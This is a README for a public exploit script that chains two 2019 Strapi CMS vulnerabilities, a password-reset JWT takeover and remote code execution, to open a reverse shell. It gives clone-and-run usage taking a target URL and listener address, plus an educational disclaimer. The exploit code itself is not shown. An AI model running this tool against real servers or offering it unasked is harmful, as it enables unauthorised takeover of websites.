# Strapi-RCE
Exploit script showcasing a mixture of CVE-2019-18818 and CVE-2019-19609 for unauthenticated remote code execution in Strapi CMS.

## Exploit

This script exploits a vulnerability in Strapi CMS versions 3.0.0-beta.17.4 and lower, allowing for unauthenticated remote code execution.

## Description

The exploit works by first leveraging a password reset vulnerability to obtain a JSON Web Token (JWT) for an administrative user. This token is then used to send a malicious payload to the Strapi CMS, which triggers a reverse shell back to the attacker's machine.

## How to Use

## How to Use

1. **Clone the Repository:**

   ```sh
   git clone https://github.com/Hackhoven/Strapi-RCE.git
   ```
2. **Navigate to the directory**

   ```sh
   cd Strapi-RCE/
   ```
3. **Run the script with the target URL, local host ip address, and local host port as arguments**
   ```sh
   python3 strapi-rce.py <TARGET_URL> <LHOST> <LPORT>
   ```


## Disclaimer
This script is intended for educational purposes only. The author does not condone or support the use of this script for illegal or unethical activities. This script should only be used in legal security research or CTF environments. Use at your own risk.



---

Made by [Hackhoven](https://github.com/Hakchoven)
